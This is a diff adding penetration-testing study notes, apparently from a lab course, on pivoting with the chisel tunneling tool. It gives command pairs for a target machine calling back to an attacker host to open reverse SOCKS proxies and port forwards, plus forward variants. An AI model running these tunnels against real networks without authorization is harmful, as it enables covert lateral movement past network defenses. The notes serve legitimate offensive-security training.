@@ -310,3 +310,60 @@ attacker > target flow
 target > attacker flow
 * response sent to socat, which goes to 8001 on the attacker
 * inbound from 8001 of the target comes out 8000 on the attacker
+
+# Task 14 - Pivoting - Chisel
+Chisel is a TCP/UDP tunnel over HTTP
+
+https://github.com/jpillora/chisel
+
+Chisel has to be on both the attacker and target machine.  Chisel has two modes: client and server
+
+Reverse SOCKS proxy with chisel:
+* Connection from target back to attacker, port 1080 is used by default once the connection is established
+```
+attacker:
+
+./chisel server -p [listen_port] --reverse &
+
+target:
+./chisel client [attacker_ip]:[listen_port] R:socks &
+```
+
+Forward SOCKS proxy with chisel:
+```
+target:
+
+./chisel server -p [listen_port] --socks5
+
+attacker:
+
+./chisel client [target_ip]:[listen_port] [proxy_port]:socks
+```
+
+* Note: configure proxychains to use socks5
+
+Remote port forward with chisel:
+```
+attacker:
+
+./chisel server -p [listen_port] --reverse &
+
+target:
+
+./chisel client [attacker_ip]:[listen_port] R:[local_port]:[target_ip]:[target_port] &
+```
+* listen_port is the port that we started the chisel server on
+* local_port is the port you connect to on the attacker machine that links you to target_port on the target machine
+
+Local port forward with chisel:
+```
+target:
+
+./chisel server -p [listen_port]
+
+attacker:
+
+./chisel client [target_ip]:[listen_port] [local_port]:[target_ip]:[target_port]
+```
+
+*Note: use the jobs command to see a list of backgrounded jobs
